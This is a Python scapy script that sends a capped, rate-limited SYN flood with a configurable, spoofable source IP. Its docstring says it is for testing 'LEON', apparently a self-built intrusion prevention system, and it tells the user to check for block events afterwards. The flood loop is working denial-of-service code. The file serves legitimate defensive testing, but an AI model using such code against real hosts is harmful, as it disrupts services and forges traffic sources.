#!/usr/bin/env python3
"""SYN flood for LEON testing — works on same machine or from a second machine.

Same machine (--src == --target):
  Sends on loopback (lo).  Run LEON WITHOUT -i so it captures on lo too:
    sudo .venv/bin/python -m prevention.run_ips --live -d 300 --prevent --honeypot
    sudo .venv/bin/python3 scripts/ddos_flood.py --src 10.200.130.91

Separate machine (recommended for demos):
  Laptop A: LEON on wlan0 (normal)
  Laptop B: just Python + scapy, no LEON clone needed
    pip install scapy
    python3 ddos_flood.py --target <A's IP> --src <B's IP>

Safety:
  - Auto-stops after --count packets
  - Rate-limited to avoid saturating the link
"""
from __future__ import annotations

import argparse
import sys
import time

try:
    from scapy.all import IP, TCP, send, sendp, Loopback, conf
except ImportError:
    print("Error: scapy not installed. Run: .venv/bin/pip install scapy")
    sys.exit(1)

conf.verb = 0


def _detect_same_machine(src: str, dst: str) -> bool:
    """Check if src and dst are the same machine by looking at local IPs."""
    import socket
    try:
        hostname = socket.gethostname()
        local_ips = {socket.gethostbyname(hostname)}
    except socket.error:
        local_ips = set()
    try:
        for info in socket.getaddrinfo(hostname, None):
            local_ips.add(info[4][0])
    except socket.error:
        pass
    local_ips.add("127.0.0.1")
    return src in local_ips and dst in local_ips


def main() -> int:
    parser = argparse.ArgumentParser(description="SYN flood for LEON testing")
    parser.add_argument("--target", default="10.200.130.91",
                        help="target IP (LEON machine's wlan0 IP)")
    parser.add_argument("--src", default="10.200.130.99",
                        help="source IP (fake attacker, or your own IP for same-machine)")
    parser.add_argument("--port", type=int, default=80,
                        help="target port (default: 80)")
    parser.add_argument("--count", type=int, default=2000,
                        help="number of SYN packets (default: 2000)")
    parser.add_argument("--rate", type=int, default=500,
                        help="packets per second (default: 500)")
    args = parser.parse_args()

    same_machine = _detect_same_machine(args.src, args.target)
    if same_machine:
        conf.iface = "lo"

    duration = args.count / args.rate
    mode = "same-machine (loopback)" if same_machine else "separate machine (wlan0)"
    print(f"SYN flood: {args.count} packets -> {args.target}:{args.port}")
    print(f"  src={args.src}  rate={args.rate} pps  duration=~{duration:.0f}s")
    print(f"  mode: {mode}")
    if same_machine:
        print(f"  NOTE: run LEON without -i to capture on lo: sudo .venv/bin/python -m prevention.run_ips --live -d 300 --prevent --honeypot")
    print()

    start = time.monotonic()
    for i in range(args.count):
        if same_machine:
            pkt = Loopback() / IP(src=args.src, dst=args.target) / TCP(dport=args.port, flags="S")
            sendp(pkt, iface="lo")
        else:
            pkt = IP(src=args.src, dst=args.target) / TCP(dport=args.port, flags="S")
            send(pkt)

        if (i + 1) % 500 == 0:
            elapsed = time.monotonic() - start
            print(f"  [{elapsed:5.1f}s] sent {i+1}/{args.count} packets")

        # rate limit
        expected = (i + 1) / args.rate
        actual = time.monotonic() - start
        if actual < expected:
            time.sleep(expected - actual)

    elapsed = time.monotonic() - start
    print(f"\nDone. {args.count} packets sent in {elapsed:.1f}s")
    print(f"Check LEON terminal for [BLOCK] events.")
    print(f"Verify: nft list set ip leon blocked")
    return 0


if __name__ == "__main__":
    sys.exit(main())
